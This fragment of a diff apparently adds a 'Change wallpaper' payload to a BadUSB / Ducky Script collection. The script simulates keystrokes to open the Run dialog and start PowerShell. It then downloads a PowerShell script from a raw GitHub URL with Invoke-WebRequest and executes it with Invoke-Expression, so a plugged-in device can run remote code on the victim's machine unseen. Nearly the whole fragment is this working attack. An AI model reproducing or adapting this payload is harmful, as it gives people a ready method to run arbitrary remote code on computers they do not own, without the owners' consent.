@@ -15,3 +15,22 @@ Code
     STRING exit
     ENTER
     LED 0 0 255
+
+
+Change wallpaper
+
+    LED 0 0 0
+    DELAY 1000
+    GUI r
+    DELAY 100
+    STRING powershell.exe
+    ENTER
+    DELAY 1000
+    STRING $ScriptFromGithHub = Invoke-WebRequest https://raw.githubusercontent.com/offport/BadUSB/main/Windows/Payloads/ChangeWallpaper.ps1
+    ENTER
+    DELAY 500
+    STRING Invoke-Expression $($ScriptFromGithHub.Content)
+    ENTER
+    STRING exit
+    ENTER
+    LED 0 0 255
